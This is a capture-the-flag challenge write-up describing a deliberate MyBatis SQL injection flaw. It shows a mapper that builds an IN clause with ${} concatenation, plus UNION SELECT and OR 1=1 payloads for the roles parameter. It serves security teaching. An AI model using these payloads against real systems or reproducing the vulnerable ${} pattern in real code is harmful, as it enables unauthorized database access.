# Level 8 — MyBatis IN Clause Injection

## Challenge Description

This challenge simulates search + role filtering. The search part is safe, but role filtering uses `${}` for IN clause construction.

**Objective**: Exploit the MyBatis IN clause injection vulnerability to capture the Flag.

## Vulnerability Analysis

**Mapper SQL**:

```xml
<select id="searchByNameSafeWithRoles" resultType="com.madrabbit.entity.ChallengeUser">
    SELECT * FROM challenge_users 
    WHERE name LIKE CONCAT('%', #{name}, '%')
    <if test="roles != null and roles != ''">
        AND role IN (${roles})
    </if>
</select>
```

**Vulnerability**: The `roles` parameter uses `${}` for direct SQL concatenation in the IN clause.

## Walkthrough

### Step 1: Normal Query

Use `roles='user','admin'` and observe normal results.

### Step 2: IN Clause Injection

Inject into `roles`: `'user') UNION SELECT 1,2,3,4,5,6--` or `'user') OR 1=1--`

### Step 3: Capture the Flag

Successful injection returns the Flag in the response.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/injection/MybatisInController.java` | Backend role filter endpoint |
| `repository/ChallengeUserMapper.xml` | MyBatis Mapper, `AND role IN (${roles})` |
| `service/FlagService.java` | Flag retrieval and validation |
